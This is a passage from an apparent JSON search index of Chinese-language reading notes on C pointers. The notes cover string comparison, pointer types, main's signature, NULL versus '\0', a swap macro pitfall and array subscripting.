\"abc\")\u8fd9\u4e2a\u8868\u8fbe\u5f0f\uff0c\u5982\u679c\u4f60\u6b63\u5728\u4f7f\u7528CLion\uff0c\u4f60\u5e94\u8be5\u4f1a\u5f97\u5230\u4e00\u4e2awarning: Result of comparison against a string literal is unspecified (use strcmp instead)\u3002\u5de6\u4fa7\u662fchar *\uff08\u6307\u5411\u4e86char\u6570\u7ec4\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\uff09\uff0c\u53f3\u4fa7\u4e5f\u662fchar *\uff08\u6307\u5411\u4e86\u5b57\u7b26\u4e32\u5b57\u9762\u91cf\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\uff09\uff0c\u4e5f\u5c31\u662f\u4e66\u4e2d\u6240\u8bf4\u7684\u8fd9\u662f\u5728\u6bd4\u8f83\u6307\u9488\u3002 \u53e6\u5916\uff0c\u6211\u8fd8\u770b\u89c1\u6709\u5927\u4e00\u540c\u5b66\u5199(str == \"\")\u8fd9\u6837\u7684\u8868\u8fbe\u5f0f\u6765\u5224\u65ad\u5b57\u7b26\u4e32\u662f\u5426\u4e3a\u7a7a\uff0c\u8fd9\u6837\u7684\u6bd4\u8f83\u6b63\u5982\u4e0a\u6587\u6240\u8bf4\uff0c\u81ea\u7136\u4e0d\u80fd\u6210\u529f\u3002\u5982\u679c\u771f\u7684\u9700\u8981\u6bd4\u8f83\uff0c\u5e94\u5f53\u4f7f\u7528strcmp()\u51fd\u6570\u3002\u5982\u679c\u662f\u4e3a\u4e86\u5224\u65ad\u5b57\u7b26\u4e32\u662f\u5426\u4e3a\u7a7a\uff0c\u53ef\u4ee5\u8fd9\u6837\uff1a 1 if ( strcmp ( str , \"\" )) { } \u6216\u8005\u5bf9\u521d\u59cb\u5316\u540e\u7684char\u578b\u6570\u7ec4\uff1a 1 if ( strlen ( str ) == 0 ) { } \u4e00\u672c\u6b63\u7ecf\u5730\u5f3a\u8c03\u8981\u521d\u59cb\u5316...\u56e0\u4e3a\u4e0d\u521d\u59cb\u5316\u7528\u8fd9\u4e2a\u662f\u5f88\u5371\u9669\u7684\uff0c\u7136\u540e\u5927\u90e8\u5206\u540c\u5b66\u7528\u7684Dev-C++\u4e5f\u4e0d\u4f1a\u8b66\u544a\u53d8\u91cf\u672a\u521d\u59cb\u5316\uff0c\u4e5f\u5c31\u5f88\u7ecf\u5e38\u6ca1\u5199\u597d\u521d\u59cb\u5316\uff08\u5176\u5b9e\u5c31\u7b97\u6709\u8b66\u544a\u6211\u4e5f\u6562\u6253\u8d4c\u597d\u591a\u540c\u5b66\u8fd8\u662f\u5f3a\u884c\u5ffd\u7565\uff09\uff0c\u7136\u540e\u559c\u6b22\u8bf4\u201c\u672c\u5730\u8fc7\u4e86\u5c31\u662f\u8fc7\u4e86\uff0c\u63d0\u793aWA\u8bf4\u660eOJ\u6709\u95ee\u9898\u201d\u8fd9\u6837\u4e0d\u8d1f\u8d23\u4efb\u7684\u8bdd\u3002\u8bb2\u771f\u53ea\u8981\u628a\u540e\u53f0\u6570\u636e\u62ff\u51fa\u6765\u8bd5\u4e00\u4e0b\uff0c99.9999%\u7684\u9505\u90fd\u662f\u5b66\u751f\u7684\u9505\u3002\uff08\u644a\u624b.jpg\uff09 \u597d\u5427\u8dd1\u9898\u8dd1\u5f97\u6709\u70b9\u8fdc\uff0c\u56de\u6765\u7ee7\u7eed\u770b\u5b57\u7b26\u4e32...\u53c8\u6216\u8005\uff0c\u76f4\u63a5\u4f7f\u7528C++\u7684STL\uff1a 1 2 std :: string str ; if ( str == \"\" ) { } \u5f53\u4f60\u4f7f\u7528string\u5bb9\u5668\u65f6\uff0c\u786e\u5b9e\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528==\u7b26\u53f7\u6765\u5224\u65ad\u662f\u5426\u76f8\u7b49\u3002\u8fd9\u4e2a\u65f6\u5019\u53ef\u80fd\u6709\u4eba\u8981\u9a82\u6211\u4e86\uff0c\u5148\u522b\u6025... 1 2 std :: string str ; if ( ! str . empty ()) { } \u53ea\u9700\u8981\u8c03\u7528empty()\u65b9\u6cd5\u5c31\u53ef\u4ee5\u5224\u65adstr\u662f\u5426\u4e3a\u7a7a\u4e86\u3002","title":"Page 15"},{"location":"reading_notes/pointer/1/#121","text":"","title":"1.2.1 \u6076\u540d\u662d\u8457\u7684\u6307\u9488\u7a76\u7adf\u662f\u4ec0\u4e48"},{"location":"reading_notes/pointer/1/#page-16","text":"\u5173\u4e8e\u201c\u6307\u9488\u201d\u4e00\u8bcd\uff0c\u5728K&R\u4e2d\u6709\u4e0b\u9762\u8fd9\u6837\u7684\u8bf4\u660e\uff08\u7b2c5\u7ae0\u201c\u6307\u9488\u548c\u6570\u7ec4\u201d\u7684\u5f00\u5934\u90e8\u5206\uff09\uff1a \u6307\u9488\u662f\u4e00\u79cd\u4fdd\u5b58\u53d8\u91cf\u5730\u5740\u7684\u53d8\u91cf\uff0c\u5728C\u4e2d\u9891\u7e41\u5730\u4f7f\u7528\u3002 \u5176\u5b9e\u5728\u8868\u8fbe\u4e0a\uff0c\u8fd9\u6837\u7684\u8bf4\u660e\u662f\u6709\u5f88\u5927\u95ee\u9898\u7684\u3002\u603b\u4f1a\u8ba9\u4eba\u611f\u89c9\uff0c\u4e00\u65e6\u63d0\u8d77\u6307\u9488\uff0c\u5c31\u8981\u628a\u5b83\u5f53\u4f5c\u53d8\u91cf\u7684\u610f\u601d\u3002\u5b9e\u9645\u4e0a\u5e76\u975e\u603b\u662f\u5982\u6b64\u3002 \u6b64\u5916\uff0c\u5728C\u8bed\u8a00\u6807\u51c6\u4e2d\u6700\u521d\u51fa\u73b0\u201c\u6307\u9488\u201d\u4e00\u8bcd\u7684\u90e8\u5206\uff0c\u6709\u8fd9\u6837\u4e00\u6bb5\u8bdd\uff1a \u6307\u9488\u7c7b\u578b \uff08pointer type\uff09\u53ef\u7531\u51fd\u6570\u7c7b\u578b\u3001\u5bf9\u8c61\u7c7b\u578b\u6216\u4e0d\u5b8c\u5168\u7684\u7c7b\u578b\u6d3e\u751f\uff0c\u6d3e\u751f\u6307\u9488\u7c7b\u578b\u7684\u7c7b\u578b\u79f0\u4e3a\u5f15\u7528\u7c7b\u578b\u3002\u6307\u9488\u7c7b\u578b\u63cf\u8ff0\u4e00\u4e2a\u5bf9\u8c61\uff0c\u8be5\u7c7b\u5bf9\u8c61\u7684\u503c\u63d0\u4f9b\u5bf9\u8be5\u5f15\u7528\u7c7b\u578b\u5b9e\u4f53\u7684\u5f15\u7528\u3002\u7531\u5f15\u7528\u7c7b\u578b T \u6d3e\u751f\u7684\u6307\u9488\u7c7b\u578b\u6709\u65f6\u79f0\u4e3a\u201c\uff08\u6307\u5411\uff09T\u7684\u6307\u9488\u201d\u3002\u4ece\u5f15\u7528\u7c7b\u578b\u6784\u9020\u6307\u9488\u7c7b\u578b\u7684\u8fc7\u7a0b\u79f0\u4e3a\u201c\u6307\u9488\u7c7b\u578b\u7684\u6d3e\u751f\u201d\u3002\u8fd9\u4e9b\u6784\u9020\u6d3e\u751f\u7c7b\u578b\u7684\u65b9\u6cd5\u53ef\u4ee5\u9012\u5f52\u5730\u5e94\u7528\u3002 \u8fd9\u6bb5\u8bdd\u7684\u5185\u5bb9\u4e5f\u8bb8\u4f1a\u8ba9\u4f60\u4e00\u5934\u96fe\u6c34\u3002\u90a3\u5c31\u8ba9\u6211\u4eec\u5148\u5173\u6ce8\u7b2c\u4e00\u53e5\u8bdd\u5427\uff0c\u90a3\u91cc\u51fa\u73b0\u4e86\u201c\u6307\u9488\u7c7b\u578b\u201d\u4e00\u8bcd\u3002 \u63d0\u5230\u201c\u7c7b\u578b\u201d\uff0c\u7acb\u523b\u4f1a\u8ba9\u4eba\u60f3\u8d77\u201cint\u7c7b\u578b\u201d\u3001\u201cdouble\u7c7b\u578b\u201d\u7b49\u3002\u540c\u6837\uff0c\u5728C\u8bed\u8a00\u4e2d\u4e5f\u5b58\u5728\u201c\u6307\u9488\u7c7b\u578b\u201d\u8fd9\u6837\u7684\u7c7b\u578b\u3002 \u201c\u6307\u9488\u7c7b\u578b\u201d\u5176\u5b9e\u4e0d\u662f\u5355\u72ec\u5b58\u5728\u7684\uff0c\u5b83\u662f\u7531\u5176\u4ed6\u7c7b\u578b \u6d3e\u751f \u800c\u6210\u7684\u3002\u4ee5\u4e0a\u5bf9\u6807\u51c6\u5185\u5bb9\u7684\u5f15\u7528\u4e2d\u4e5f\u63d0\u5230\u201c\u7531\u5f15\u7528\u7c7b\u578bT\u6d3e\u751f\u7684\u6307\u9488\u7c7b\u578b\u6709\u65f6\u79f0\u4e3a\u2018\uff08\u6307\u5411\uff09 T\u7684\u6307\u9488\u2019\u201d\u3002 \u4e5f\u5c31\u662f\u8bf4\uff0c\u5b9e\u9645\u4e0a\u5b58\u5728\u7684\u7c7b\u578b\u662f\u201c\u6307\u5411int\u7684\u6307\u9488\u7c7b\u578b\u201d\u3001\u201c\u6307\u5411double\u7684\u6307\u9488\u7c7b\u578b\u201d\u3002 \u56e0\u4e3a\u201c\u6307\u9488\u7c7b\u578b\u201d\u662f\u7c7b\u578b\uff0c\u6240\u4ee5\u5b83\u548cint\u7c7b\u578b\u3001double\u7c7b\u578b\u4e00\u6837\uff0c\u4e5f\u5b58\u5728\u201c\u6307\u9488\u7c7b\u578b\u53d8\u91cf\u201d\u548c\u201c\u6307\u9488\u7c7b\u578b\u7684\u503c\u201d\u3002\u7cdf\u7cd5\u7684\u662f\uff0c\u201c\u6307\u9488\u7c7b\u578b\u201d\u3001\u201c\u6307\u9488\u7c7b\u578b\u53d8\u91cf\u201d\u548c\u201c\u6307\u9488\u7c7b\u578b\u7684\u503c\u201d\u7ecf\u5e38\u88ab\u7b80\u5355\u5730\u7edf\u79f0\u4e3a\u201c\u6307\u9488\u201d\uff0c\u6240\u4ee5\u975e\u5e38\u5bb9\u6613\u9020\u6210\u6b67\u4e49\uff0c\u8fd9\u4e00\u70b9\u9700\u8981\u63d0\u9ad8\u8b66\u60d5\u3002 \u8981\u70b9 \u5148\u6709\u201c\u6307\u9488\u7c7b\u578b\u201d\u3002 \u56e0\u4e3a\u6709\u4e86\u201c\u6307\u9488\u7c7b\u578b\u201d\uff0c\u6240\u4ee5\u6709\u4e86\u201c\u6307\u9488\u7c7b\u578b\u7684\u53d8\u91cf\u201d\u548c\u201c\u6307\u9488\u7c7b\u578b\u7684\u503c\u201d\u3002 \u6bd4\u5982\uff0c\u5728C\u4e2d\uff0c\u4f7f\u7528int\u7c7b\u578b\u8868\u793a\u6574\u6570\u3002\u56e0\u4e3aint\u662f\u201c\u7c7b\u578b\u201d\uff0c\u6240\u4ee5\u5b58\u5728\u7528\u4e8e\u4fdd\u5b58int\u578b\u7684\u53d8\u91cf\uff0c\u5f53\u7136\u4e5f\u5b58\u5728int\u578b\u7684\u503c\u3002 \u6307\u9488\u7c7b\u578b\u540c\u6837\u5982\u6b64\uff0c\u65e2\u5b58\u5728\u6307\u9488\u7c7b\u578b\u7684\u53d8\u91cf\uff0c\u4e5f\u5b58\u5728\u6307\u9488\u7c7b\u578b\u7684\u503c\u3002 \u56e0\u6b64\uff0c\u51e0\u4e4e\u6240\u6709\u7684\u5904\u7406\u7a0b\u5e8f\u4e2d\uff0c\u6240\u8c13\u7684\u201c\u6307\u9488\u7c7b\u578b\u7684\u503c\u201d\uff0c\u5b9e\u9645\u662f\u6307 \u5185\u5b58\u7684\u5730\u5740 \u3002 \u4e5f\u4e0d\u77e5\u9053\u6458\u8fd9\u4e48\u957f\u4e00\u6bb5\u51fa\u6765\u6709\u6ca1\u6709\u4eba\u770b...\u4e3b\u8981\u662f\u633a\u7ecf\u5e38\u8981\u8ddf \u5927\u4e8c \u7684\u5b66\u751f\u89e3\u91ca\u8fd9\u4e2a\u95ee\u9898\uff1a\u201c\u6307\u9488\u7c7b\u578b\u201d\u662f\u7531\u5176\u5b83\u7c7b\u578b\u6d3e\u751f\u800c\u6210\u7684\uff0c\u800c\u975e\u6307\u5411\u4efb\u4f55\u4e0d\u540c\u5bf9\u8c61\u7684\u6307\u9488\u90fd\u662f\u540c\u4e00\u79cd\u7c7b\u578b\uff08\u597d\u5427\u8fd9\u540e\u534a\u53e5\u6211\u4e5f\u89e3\u91ca\u4e0d\u6e05\u695a\uff0c\u8c01\u8ba9\u6211\u6839\u672c\u4e0d\u77e5\u9053\u5404\u4f4d\u540c\u5b66\u662f\u600e\u4e48\u88ab\u6559\u574f\u7684\u5462\uff09\u3002 \u8fd8\u6709\u4e2a\u66f4\u8981\u547d\u7684\u95ee\u9898\u5c31\u662f...\u5b66\u6821\u7684\u4e60\u9898\u57fa\u672c\u4e0a\u662f\u8ba9\u4f60\u62ff\u51e0\u4e2a\u6307\u9488\u5904\u7406\u5404\u79cd\u6570\u7ec4\u548c\u5b57\u7b26\u4e32\uff0c\u4e5f\u4e0d\u8bb2\u8bb2\u6307\u9488\u548c\u6570\u7ec4\u4e4b\u95f4\u7684\u533a\u522b\uff0c\u6700\u540e\u6211\u770b\u5230\u7684\u90fd\u662f\u4e00\u5806\u98ce\u683c\u5947\u5dee\u7684\u4ee3\u7801\u548c\u5404\u79cd\u7c7b\u578b\u4e0d\u5339\u914d...\uff08\u644a\u624b.jpg\uff09 \u540e\u7eed\u6162\u6162\u6765\u8c08\u4e0a\u9762\u7684\u8fd9\u4e9b\u95ee\u9898\uff0c\u7279\u522b\u662f\u8bed\u6cd5\u7cd6\u4e4b\u7c7b\u7684\u90e8\u5206\u3002","title":"Page 16"},{"location":"reading_notes/pointer/1/#122","text":"","title":"1.2.2 \u548c\u6307\u9488\u7684\u7b2c\u4e00\u6b21\u4eb2\u5bc6\u63a5\u89e6"},{"location":"reading_notes/pointer/1/#page-19","text":"\u524d\u9762\u66fe\u7ecf\u63d0\u5230\uff0c\u56e0\u4e3a\u5b58\u5728\u201c\u6307\u9488\u7c7b\u578b\u201d\uff0c\u6240\u4ee5\u5b58\u5728\u201c\u6307\u9488\u7c7b\u578b\u7684\u53d8\u91cf\u201d\u548c\u201c\u6307\u9488\u7c7b\u578b\u7684\u503c\u201d\u3002\u8fd9\u91cc\u8f93\u51fa\u7684\u201c\u5730\u5740\u201d\uff0c\u662f\u6307\u201c\u6307\u9488\u7c7b\u578b\u7684\u503c\u201d\u3002 \u53e6\u5916\uff0c\u4ee5\u4e0a\u7684\u4f8b\u5b50\u5728\u4f7f\u7528printf()\u8f93\u51fa\u6307\u9488\u7684\u503c\u65f6\uff0c\u4f7f\u7528\u4e86\u53c2\u6570%p\u3002\u5f88\u591a\u4eba\u90fd\u4f7f\u7528\u8fc7%x \u8fd9\u6837\u7684\u53c2\u6570\u3002\u9057\u61be\u7684\u662f\uff0c\u8fd9\u79cd\u4f7f\u7528\u65b9\u5f0f\u662f \u9519\u8bef \u7684\u3002\u5173\u4e8e\u8fd9\u70b9\u7684\u89e3\u91ca\uff0c\u8bf7\u53c2\u71671.2.3\u8282\u3002","title":"Page 19"},{"location":"reading_notes/pointer/1/#int-mainvoid","text":"","title":"\u8865\u5145 \u5173\u4e8eint main(void)"},{"location":"reading_notes/pointer/1/#page-22","text":"\u5728C\u8bed\u8a00\u6807\u51c6\u4e2d\uff0c\u5173\u4e8emain()\u51fd\u6570\u7684\u4f7f\u7528\u53ea\u6709\u5982\u4e0b\u4e24\u79cd\u65b9\u5f0f\uff1a int main(int argc, char *argv[]) \u6216\u8005 int main(void) \u5c3d\u7ba1\u5982\u6b64\uff0c\u8fd8\u662f\u53ef\u4ee5\u5728\u4e00\u4e9b\u5165\u95e8\u4e66\u7c4d\u4e2d\u9047\u5230 void main(void) \u8fd9\u6837\u7684\u5199\u6cd5\uff0c \u8fd9\u662f\u9519\u8bef\u7684 \u3002\u786e\u5b9e\uff0c\u5c31\u7b97\u662f\u8fd9\u4e48\u5199\uff0c\u5f88\u591a\u7a0b\u5e8f\u4e5f\u80fd\u52a8\u8d77\u6765\u3002\u4f46\u662f\u5728\u6709\u4e9b\u73af\u5883\u4e0b\uff0c\u7f16\u8bd1\u5668\u53ef\u80fd\u4f1a\u62a5\u544a\u4e00\u4e9b\u8b66\u544a\u4fe1\u606f\u3002 main \u51fd\u6570\u8fd4\u56de\u4e00\u4e2a int \u7c7b\u578b\u7684\u503c\uff0c\u56e0\u6b64\u5728\u5904\u7406\u7684\u6700\u540e\u5fc5\u987b\u6709 return \uff08\u73b0\u5728\u7684\u5f88\u591a\u7f16\u8bd1\u5668\u90fd\u4f1a\u63d0\u793a\u6ca1\u6709return\u7684\u8b66\u544a\uff09\u3002 \u672c\u4e66\u6240\u6709\u4f8b\u7a0b\u7684 main \u51fd\u6570\u7684\u672b\u5c3e\u90fd\u5199\u4e86 return 0\uff1b\u3002 \u8fd4\u56de0\u8868\u793a\u901a\u77e5\u8fd0\u884c\u73af\u5883\u7a0b\u5e8f\u201c\u6b63\u5e38\u7ed3\u675f\u201d\u3002","title":"Page 22"},{"location":"reading_notes/pointer/1/#null00","text":"","title":"\u8865\u5145 NULL\u30010\u548c'\\0'"},{"location":"reading_notes/pointer/1/#page-28","text":"\u7ecf\u5e38\u6709\u4e00\u79cd\u9519\u8bef\u7684\u7a0b\u5e8f\u5199\u6cd5\uff1a\u4f7f\u7528NULL\u6765\u7ed3\u675f\u5b57\u7b26\u4e32\u3002 /* \u901a\u5e38\uff0cC\u7684\u5b57\u7b26\u4e32\u4f7f\u7528'\\0'\u7ed3\u5c3e\uff0c\u53ef\u662f\u56e0\u4e3astrnpy()\u51fd\u6570\u5728src\u7684\u957f\u5ea6\u5927\u4e8elen\u7684\u60c5\u51b5\u4e0b\u6ca1\u6709\u4f7f\u7528'\\0'\u6765\u7ed3\u675f\uff0c\u6240\u4ee5\u4e00\u677f\u4e00\u773c\u5730\u5199\u4e86\u4e00\u4e2a\u6574\u7406\u6210C\u7684\u5b57\u7b26\u4e32\u5f62\u5f0f\u7684\u51fd\u6570\uff08\u4f01\u56fe\uff09 */ void my_strncpy(char *dest, char *src, int len) { strncpy(dest, src, len); dest[len] = NULL; \u2190\u4f7f\u7528NULL\u6765\u7ed3\u675f\u5b57\u7b26\u4e32\uff01\uff01 } \u4e0a\u9762\u7684\u4ee3\u7801\uff0c\u5c3d\u7ba1\u5728\u67d0\u4e9b\u8fd0\u884c\u73af\u5883\u4e0b\u80fd\u8dd1\u8d77\u6765\uff0c\u4f46\u65e0\u8bba\u600e\u6837\u5b83\u5c31\u662f\u9519\u8bef\u7684\u3002\u56e0\u4e3a\u5b57\u7b26\u4e32\u662f\u4f7f\u7528\u201c\u7a7a\u5b57\u7b26\u201d\u6765\u7ed3\u675f\u7684\uff0c\u800c\u4e0d\u662f\u7528\u7a7a\u6307\u9488\u6765\u7ed3\u675f\u3002 \u5728C\u8bed\u8a00\u6807\u51c6\u4e2d\uff0c\u7a7a\u5b57\u7b26\u7684\u5b9a\u4e49\u4e3a\u201c\u6240\u6709\u7684\u4f4d\u4e3a0\u7684\u5b57\u8282\u79f0\u4e3a \u7a7a\u5b57\u7b26 \uff08null character\uff09\u201d\uff085.2.1\uff09\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u7a7a\u5b57\u7b26\u662f\u503c\u4e3a0\u7684\u5b57\u7b26\u3002 \u7a7a\u5b57\u7b26\u5728\u8868\u73b0\u4e0a\u901a\u5e38\u4f7f\u7528'\\0'\u3002\u56e0\u4e3a'\\0'\u662f\u5e38\u91cf\uff0c\u6240\u4ee5\u5b9e\u9645\u4e0a\u5b83\u7b49\u540c\u4e8e0\u3002\u4e5f\u8bb8\u6709\u4e9b\u5413\u5230\u4f60\u4e86\uff0c'\\0'\u5440'a'\u5440\u4ec0\u4e48\u7684\uff0c\u5b83\u4eec\u7684\u6570\u636e\u7c7b\u578b\u5176\u5b9e\u5e76\u4e0d\u662fchar\uff0c\u800c\u662fint\uff08\u6ce8\uff09\u3002 \u6ce8\uff1a\u5982\u679c\u662fC++\uff0c\u5c31\u4e0d\u662f\u8fd9\u4e2a\u7ed3\u8bba\u4e86\u3002 https://stackoverflow.com/questions/433895/why-are-c-character-literals-ints-instead-of-chars","title":"Page 28"},{"location":"reading_notes/pointer/1/#126-swap","text":"","title":"1.2.6 \u5b9e\u8df5\u2014\u2014swap\u51fd\u6570"},{"location":"reading_notes/pointer/1/#page-31","text":"\u8c03\u7528C\u7684\u51fd\u6570\uff0c\u53c2\u6570\u4f20\u9012\u5f80\u5f80\u662f \u4f20\u503c \uff0c\u8fd9\u79cd\u65b9\u5f0f\u4f20\u9012\u7684\u662f\u53c2\u6570\u7684\u526f\u672c\u3002","title":"Page 31"},{"location":"reading_notes/pointer/1/#page-33","text":"\u8bf4\u4e2a\u9898\u5916\u8bdd\uff0c\u5982\u679c\u4ec5\u4ec5\u662f\u9700\u8981\u4ea4\u6362\u6574\u578b\u53d8\u91cf\u7684\u503c\uff0c\u5b8c\u5168\u4e0d\u4f7f\u7528\u4e34\u65f6\u53d8\u91cf\u4e5f\u662f\u53ef\u4ee5\u7684\u3002\u6bd4\u5982\u4f7f\u7528\u4e0b\u9762\u7684\u5b8f\u5b9a\u4e49\uff1a #define SWAP(a, b) (a += b, b = a - b, a -= b) \u5728\u8fd9\u79cd\u65b9\u5f0f\uff08\u8fd8\u53ef\u4ee5\u4f7f\u7528\u5f02\u6216\u8fd0\u7b97\u7b26\uff09\u4e0b\uff0c\u5728\u98a0\u5012\u4f7f\u7528\u540c\u4e00\u4e2a\u53d8\u91cf\u65f6\uff0c\u8fd9\u4e2a\u7a0b\u5e8f\u662f\u4e0d\u80fd\u6b63\u5e38\u8fd0\u884c\u7684\u3002\u6bd4\u5982\u4f60\u5199\u4e86SWAP(a[i], a[j])\uff0c\u5e76\u4e14\u6070\u5de7i == j\uff0c\u90a3\u6211\u53ea\u80fd\u606d\u559c\u4f60\u4e2d\u62db\u4e86\u3002\u5f53\u7136\uff0c\u5982\u679c\u4f60\u80fd\u62c5\u4fdd\u8fd9\u79cd\u60c5\u51b5\u6c38\u8fdc\u4e0d\u53ef\u80fd\u51fa\u73b0\uff0c\u4f7f\u7528\u8fd9\u4e2a\u5b8f\u4e5f\u672a\u5c1d\u4e0d\u53ef\u3002","title":"Page 33"},{"location":"reading_notes/pointer/1/#_1","text":"","title":"\u8865\u5145 \u5f62\u53c2\u548c\u5b9e\u53c2"},{"location":"reading_notes/pointer/1/#page-33_1","text":"\u51e0\u4e4e\u6240\u6709\u7684 C\u8bed\u8a00\u7684\u5165\u95e8\u4e66\u7c4d\u4e2d\uff0c\u90fd\u4f1a\u8bb2\u89e3\u201c\u5f62\u53c2\u201d\u548c\u201c\u5b9e\u53c2\u201d\u7684\u6982\u5ff5\u3002\u4f46\u662f\u5b83\u4eec\u8fd8\u662f\u7ecf\u5e38\u88ab\u8f7b\u6613\u6df7\u6dc6\u3002 \u5b9e\u53c2 \u662f\u8c03\u7528\u51fd\u6570\u65f6\u7684\u53c2\u6570\u3002 func(5); \u2190\u8fd9\u91cc\u76845\u662f\u5b9e\u53c2\u3002 \u5f62\u53c2 \u662f\u63a5\u53d7\u5b9e\u53c2\u7684\u4e00\u65b9\u3002 void func(int hoge) \u2190\u8fd9\u91cc\u7684hoge\u662f\u5f62\u53c2 { }","title":"Page 33"},{"location":"reading_notes/pointer/1/#133","text":"","title":"1.3.3 \u4e0b\u6807\u8fd0\u7b97\u7b26[]\u548c\u6570\u7ec4\u662f\u6ca1\u6709\u5173\u7cfb\u7684"},{"location":"reading_notes/pointer/1/#page-39","text":"\u5728\u524d\u4e00\u5c0f\u8282\u7684\u201c\u6539\u5199\u7248\u201d\u4f8b\u7a0b\u4e2d\uff0c\u50cf\u4e0b\u9762\u8fd9\u6837\u5c06\u6307\u9488\u6307\u5411\u6570\u7ec4\u7684\u521d\u59cb\u5143\u7d20\u3002 p = &array[0]; \u5176\u5b9e\u4e5f\u53ef\u4ee5\u5199\u6210\u4e0b\u9762\u8fd9\u6837\uff1a p = array; \u5bf9\u4e8e\u8fd9\u79cd\u5199\u6cd5\uff0c\u5f88\u591aC\u8bed\u8a00\u7684\u5165\u95e8\u4e66\u7c4d\u662f\u8fd9\u6837\u8bf4\u660e\u7684\uff1a \u5728 C\u4e2d\uff0c\u5982\u679c\u5728\u6570\u7ec4\u540d\u540e\u4e0d\u52a0[]\uff0c\u5355\u72ec\u5730\u53ea\u5199\u6570\u7ec4\u540d\uff0c\u90a3\u4e48\u6b64\u540d\u79f0\u5c31\u8868\u793a\u201c\u6307\u5411\u6570\u7ec4\u521d\u59cb\u5143\u7d20\u7684\u6307\u9488\u201d\u3002 \u5728\u8fd9\u91cc\uff0c\u6211\u53ef\u4ee5\u8d1f\u8d23\u5730\u544a\u8bc9\u4f60\uff0c\u4e0a\u9762\u7684\u8bf4\u660e\u662f\u9519\u8bef\u7684*\u3002 * \u5982\u679c\u8003\u8651\u7ed9\u4eba\u7559\u70b9\u9762\u5b50\uff0c\u5176\u5b9e\u6211\u5e94\u8be5\u8fd9\u4e48\u8bf4\uff1a\u201d\u4e0d\u80fd\u8bf4\u8fd9\u4e2a\u8bf4\u660e\u603b\u662f\u5bf9\u7684\u3002\u201c\u53ef\u662f\u8003\u8651\u4e00\u4e0b\u542c\u5230\u8fd9\u4e2a\u8bf4\u660e\u7684\u4eba\u5982\u4f55\u89e3\u91ca\u5b83\uff0c\u5c31\u611f\u89c9\u8fd8\u4e0d\u5982\u75db\u75db\u5feb\u5feb\u5730\u6307\u51fa\u6765\u201d\u8fd9\u4e2a\u8bf4\u660e\u5b8c\u5168\u662f\u9519\u8bef\u7684\u201c\u3002 \u53c8\u60ca\u7740\u4f60\u4e86\u5427\uff1f \u5728 C\u7684\u4e16\u754c\u91cc\uff0c\u4e8b\u5230\u5982\u4eca\u4f60\u518d\u53bb\u5426\u5b9a\u201c\u6570\u7ec4\u540d\u540e\u4e0d\u52a0[]\uff0c\u5c31\u4ee3\u8868\u6307\u5411\u521d\u59cb\u5143\u7d20\u7684\u6307\u9488\u201d\u8fd9\u4e2a\u201c\u5f3a\u5927\u7684\u201d \u8bef\u89e3 \u663e\u5f97\u6709\u70b9\u65e0\u5948\u3002\u5bf9\u4e8e\u8fd9\u79cd\u5df2\u7ecf\u6df1\u5165\u4eba\u5fc3\u7684\u89c2\u70b9\uff0c\u4f60\u7a81\u7136\u653e\u8a00\u5b83\u5176\u5b9e\u662f\u4e2a\u8bef\u89e3\uff0c\u53ef\u80fd\u5f88\u591a\u4eba\u65e0\u6cd5\u63a5\u53d7\u3002\u4e0b\u9762\u8ba9\u6211\u4eec\u4f9d\u6cd5\u6765\u8bc1\u660e\u3002 \u5c06&array[0]\u6539\u5199\u6210array\uff0c\u201c\u6539\u5199\u7248\u201d\u7684\u7a0b\u5e8f\u751a\u81f3\u53ef\u4ee5\u5199\u6210\u4e0b\u9762\u8fd9\u6837\uff1a p = array; \u2190\u53ea\u662f\u6539\u5199\u4e86\u8fd9\u91cc\uff0c\u53ef\u662f\u2026\u2026 for (i = 0; i < 5; i++) { printf(\"%d\\n\", *(p + i)); } \u53e6\u5916\uff0c\u7a0b\u5e8f\u4e2d*(p + i)\u4e5f\u53ef\u4ee5\u5199\u6210 p[i]\u3002 p = array; for (i = 0; i < 5; i++) { printf(\"%d\\n\", p[i]); } \u4e5f\u5c31\u662f\u8bf4\uff0c *(p + i) \u548c p[i] \u662f\u540c\u6837\u7684\u610f\u601d\u3002\u53ef\u4ee5\u8ba4\u4e3a\u540e\u9762\u7684\u5199\u6cd5\u662f\u524d\u9762\u7684\u7b80\u4fbf\u5199\u6cd5\u3002 \u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u6700\u521d\u901a\u8fc7 p = array;\u5b8c\u6210\u4e86\u5411 p \u7684\u8d4b\u503c\uff0c\u4f46\u4e4b\u540e p \u4e00\u76f4\u6ca1\u6709\u53d1\u751f\u66f4\u6539\u3002\u6240\u4ee5\uff0c\u65e9\u77e5\u5982\u6b64\uff0c\u4f55\u5fc5\u5f53\u521d\u504f\u8981\u591a\u58f0\u660e\u4e00\u4e2ap\uff0c\u8fd8\u4e0d\u5982\u4e00\u5f00\u59cb\u5c31\u5199\u6210array\u5462\u3002 for (i = 0; i < 5; i++) { printf(\"%d\\n\", array[i]); } \u5440\uff0c\u597d\u50cf\u53c8\u56de\u53bb\u4e86\u5462\u3002 \u7ed3\u8bba\u5c31\u662f\uff0c p[i] \u8fd9\u79cd\u5199\u6cd5\u53ea\u4e0d\u8fc7\u662f *(p + i) \u8fd9\u79cd\u5199\u6cd5\u7684\u7b80\u4fbf\u5199\u6cd5\uff0c \u9664\u6b64\u4e4b\u5916\uff0c\u5b83\u6beb\u65e0\u610f\u4e49 \u3002array[i]\u548cp[i]\u6709\u4ec0\u4e48\u4e0d\u4e00\u6837\u5417\uff1farray[i]\u4e5f\u53ef\u4ee5\u50cf p[i]\u4e00\u6837\uff0c\u5c06 array \u89e3\u8bfb\u6210\u201c\u6307\u5411\u6570\u7ec4\u7684\u521d\u59cb\u5143\u7d20\u7684\u6307\u9488\u201d\u3002 \u4e5f\u5c31\u662f\u8bf4\uff0c\u5b58\u5728 int array[5]; \u8fd9\u6837\u7684\u58f0\u660e\u7684\u65f6\u5019\uff0c\u201c\u4e00\u65e6\u540e\u9762\u4e0d\u8ffd\u52a0[]\uff0c\u53ea\u5199array\u201d\u5e76\u4e0d\u4ee3\u8868\u8981\u4f7farray\u5177\u6709\u6307\u5411\u6570\u7ec4\u7b2c1 